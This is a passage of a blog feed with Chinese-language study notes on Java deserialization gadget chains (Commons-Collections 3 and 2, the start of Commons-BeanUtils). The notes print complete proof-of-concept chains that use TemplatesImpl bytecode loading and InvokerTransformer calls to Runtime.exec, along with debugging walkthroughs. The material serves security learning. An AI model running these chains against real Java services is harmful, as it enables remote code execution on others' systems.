src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714667122114-6b707d16-67b2-4975-b70f-a170a58e559d.png" alt=""></p><p>所以这里我们可以通过调用InstantiateTransformer的transform方法来触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       <span class="comment">// 获取 class 对象</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 触发方法</span></span><br><span class="line">       Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span> [] &#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span> [] &#123;templates&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">       <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">       <span class="comment">/*InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">       instantiateTransformer.transform(TrAXFilter.class);*/</span></span><br><span class="line">       HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">       Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">               map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">       constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">       <span class="comment">//serialize(o);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714669560414-6960b378-e64f-44d0-9074-f683ae520ea9.pdf">Java安全漫谈 - 14.为什么需要CommonsCollections3.pdf</a></p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123376523">https://blog.csdn.net/weixin_54648419/article/details/123376523</a></p><h3 id="cc3调用链">cc3调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669437495-5c7c2b2f-a311-4a6d-b4d7-77283e919462.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;java cc3链&lt;br&gt;
cc3用的是动态加载字节码的形式进行的rce可以参考自己记得&lt;a href=&quot;&quot;&gt;动态加载字节码&lt;/a&gt;的笔记来了解。&lt;/p&gt;
&lt;p&gt;该链主要是利用了TemplatesImpl这个类进行字节码加载。通过笔记我们了解到java加载.class的核心</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections2反序列化</title>
    <link href="https://oceanzbz.github.io/post/86fa8364.html"/>
    <id>https://oceanzbz.github.io/post/86fa8364.html</id>
    <published>2024-12-30T06:35:45.000Z</published>
    <updated>2025-03-05T07:24:36.786Z</updated>
    
    <content type="html"><![CDATA[<p>通过yso的代码可以看出，cc2利用链用的是commons-collections4版本，而我们之前用的是3.1版本。所以首先要下载一下依赖，pom文件加入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="调用方式1：">调用方式1：</h3><p>然后就是他前半部分的调用链变了先来看一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">        field.set(queue,comparator);<span class="comment">//设置参数</span></span><br></pre></td></tr></table></figure><p>通过poc我们发现后半部分也是用的也是invokertransformer进行触发的，这里主要看前半部分怎么调用的</p><p>还是通过跟是谁transform方法我们找到了TransformingComparator这个类中的compare方法调用了transform方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718150278-b61e0267-8fc1-42a8-a328-6bd031a8d11e.png" alt=""></p><p>所以我们只需将trangsformer变成invokertransformer对象就可以rce了</p><p>再来看看其构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718263591-c880068a-15be-4705-9b86-c3c6f2bf29d5.png" alt=""></p><p>可以看到transformer是可控的所以我们现在需要找到能够触发compare的方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718373798-aaecb373-63f9-4b95-b6fc-615b6b0ce0ed.png" alt=""></p><p>我们找到了PriorityQueue类中的siftDownUsingComparator方法调用了compare方法，这里看下构造方法发现comparator也是可控的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718478028-692020a7-c1e9-47d5-b72f-e696f05b1e56.png" alt=""></p><p>所以现在需要找到可以触发siftDownUsingComparator的方法我们发现在本类的siftDown方法调用了该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718872060-36c80a00-7650-457e-857f-f5aa9a5d74bd.png" alt=""></p><p>并且在本类的readObject中发现heapify调用了siftDown方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718555670-e74f356c-5991-4662-b0fa-d3ba3008b81f.png" alt=""></p><p>并且该size需要大于等于2才可以进入for循环所以可以构造poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br></pre></td></tr></table></figure><p>运行发现在序列化之前就触发了原因在于add方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718641827-ee67f3d4-9524-4118-88f3-30134d1b30a5.png" alt=""></p><p>调用了offer方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718669019-1053aa9e-85c4-448d-98bf-30f88a2a5086.png" alt=""></p><p>该方法又调用了siftUp方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714718687690-eec61593-5bfb-4225-b5ea-20ca9ff9089d.png" alt=""></p><p>发现在该方法中也调用了siftDownUsingComparator方法所以我们需要在add的时候将comparartor让其值为空，在add之后在反射将其值该为TransformingComparator对象就行poc如开头所示</p><h3 id="cc2-调用链">cc2 调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740045347-efcf625e-3fc6-400e-b021-6d8b84d8e192.png" alt=""></p><h3 id="调用方式2">调用方式2</h3><p>第二种调用方法就是结合CC3中所介绍到的动态加载字节码的形式进行触发rce，因为通过上文分析的我们知道cc2会在TransformingComparator这个类中的compare方法中调用transform方法，所以这里我们想到利用Invokertransform这个类中的transform方法来调用任意类的方法，也就是通过在这里注入invokertransform对象调用transform方法在调用TemplateImpl中的newTransformer方法来进而触发动态类加载实现rce。</p><p>这里给出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取 class 对象</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">invokertransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;&#125;);</span><br><span class="line">       <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">       <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(comparator);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">       queue.add(templates);</span><br><span class="line">       queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;</span>).getDeclaredField(<span class="string">&quot;transformer&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">       field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">       field.set(comparator,invokertransformer);<span class="comment">//设置参数</span></span><br><span class="line">       <span class="comment">//serialize(queue);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>其实通过poc我们能够发现就是将最后改成动态调用newTransformer方法。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732359599-e550a791-ad16-48a8-baa8-89915e90bca2.png" alt=""></p><h4 id="问题1：">问题1：</h4><p>这里其实我们很容易想明白就是利用invokertransform的transform方法去动态调用newTransformer方法但是你执行会发现报错找不到这个方法，是因为我们并没有将该方法的类对象传递进去这里如何不利用ChainedTransformer进行传递呢</p><p>通过调试我们可以通过add方法进行添加</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732743981-a67b8b99-d4cd-4898-8565-fb99f2d7e1b4.png" alt=""></p><p>他会传入到offer里面，offer会继续调用 siftUp方法</p><p>继续将我们传入的参数放进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732814267-bc951645-86cb-4e72-beb6-3fd050fa821d.png" alt=""></p><p>可以看到已经是被传递进来了。</p><h4 id="问题2：">问题2：</h4><p>然后我们发现我们的poc在一开始的时候并没有将一个真的invokertransformer放进去<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714732918709-a4c299c3-83cc-4390-94b8-03cb0e133357.png" alt=""></p><p>而是在add之后通过反射修改了其值，这里上文也说了是为了防止在add时触发rce。</p><h4 id="问题3：">问题3：</h4><p>就是我们在add的时候需要传入两个templates对象吗，这里经过实验只需要对第一个传入即可，并且第一个必须传入。我们来调试看看为什么我们以只传入第一个templates对象为例进行反序列化调试</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733177259-e939a2b9-9259-44af-95c4-092e61efe2ba.png" alt=""></p><p>在反序列化的时候可以看到它获取的是第一个传递的参数的值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733194896-b2c9ae69-ef70-4c7b-a581-58effd95e190.png" alt="">继续跟进发现确实取出来的是第一个参数的值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714733235272-4a1546c9-d040-42f1-86c9-7352f7293085.png" alt=""></p><p>这里调用的也确实是x的值，结合前面两个方法分析说明第一个参数必须传入templates对象。</p><h3 id="cc2-TemplatesImpl调用链">cc2 TemplatesImpl调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714740139727-d5bf08f6-e29f-4937-9eaa-82a02296e5c5.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;通过yso的代码可以看出，cc2利用链用的是commons-collections4版本，而我们之前用的是3.1版本。所以首先要下载一下依赖，pom文件加入：&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-BeanUtils反序列化</title>
    <link href="https://oceanzbz.github.io/post/ddf20f9.html"/>
    <id>https://oceanzbz.github.io/post/ddf20f9.html</id>
    <published>2024-12-30T06:33:27.000Z</published>
    <updated>2025-03-05T07:24:36.785Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java-cb链">java cb链</h2><h3 id="环境搭建">环境搭建</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里直接用maven搭建一个简易的环境主要是用来记录一下</p><h3 id="分析">分析</h3><p>先来写一个demo看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zbz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">demo</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span 